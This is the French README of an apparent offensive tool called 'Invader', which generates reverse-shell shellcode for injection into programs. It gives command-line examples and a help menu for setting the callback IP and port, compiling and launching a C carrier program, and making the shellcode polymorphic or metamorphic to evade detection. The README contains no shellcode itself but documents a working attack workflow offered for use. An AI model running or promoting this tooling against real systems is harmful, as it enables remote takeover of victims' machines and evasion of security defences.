# Invader
         ____  ____   __ __   ____  ___      ___  ____  
        |    ||    \ |  |  | /    ||   \    /  _]|    \ 
         |  | |  _  ||  |  ||  o  ||    \  /  [_ |  D  )
         |  | |  |  ||  |  ||     ||  D  ||    _]|    / 
         |  | |  |  ||  :  ||  _  ||     ||   [_ |    \ 
         |  | |  |  | \   / |  |  ||     ||     ||  .  \\
        |____||__|__|  \_/  |__|__||_____||_____||__|\_|

Création automatique d'un reverse shell (via shellcode) à injecter dans un programme (exemple C directement disponible dans le git).
Il y a la possibilité de changer l'ip et le port du reverse shell et de rendre le shell métamorphique et/ou polymorphique.

<---------------------------------------- EXEMPLES ---------------------------------------->  
Exemple : python ./final/py/invader.py -s ./final/asm/fnl_reverse_shell.asm                                     # Retourne le shellcode  
Exemple : python ./final/py/invader.py -c ./final/c/fnl_reverse_shell.c                                         # Compile et lance le programme c  
Exemple : python ./final/py/invader.py -c -s ./final/asm/fnl_reverse_shell.asm                                  # Compile et lance le programme avec le shellcode du fichier asm  
Exemple : python ./final/py/invader.py -p 4444 -s ./asm/fnl_reverse_shell.asm                                   # Retourne le shellcode du fichier en changeant le port  
Exemple : python ./final/py/invader.py -i 127.0.0.1 -s ./final/asm/fnl_reverse_shell.asm                        # Retourne le shellcode du fichier en changeant l'ip  
Exemple : python ./final/py/invader.py -c -s ./final/asm/fnl_reverse_shell.asm -i 127.0.0.1 -p 4444             # Compile et lance le programme avec le shellcode du fichier.asm en changeant l'ip et le port  
Exemple : python ./final/py/invader.py -c -s ./final/asm/fnl_reverse_shell.asm -i 127.0.0.1 -p 4444 -v -M -P    # Compile et lance le programme avec le shellcode du fichier.asm en changeant l'ip et le port avec le polymorphisme et le metamorphisme activé  
<---------------------------------------- EXEMPLES ---------------------------------------->  
  
<------------------------------------------ HELP ------------------------------------------>  
-h Affiche ce message  
-e Affiche des exemples de commandes  
-v Active le mode verbosité  
-vvv Active le mode haute verbosité (objdump)  
-s Création de lu shellcode  
-c compile un fichier.c et le lance  
-i Changement de l'ip dans le shellCode  
-p Changement du port dans le shellCode  
-M Activation du metamorphisme du shellcode  
-P Activation du polymorphisme du shellcode  
<------------------------------------------ HELP ------------------------------------------>  
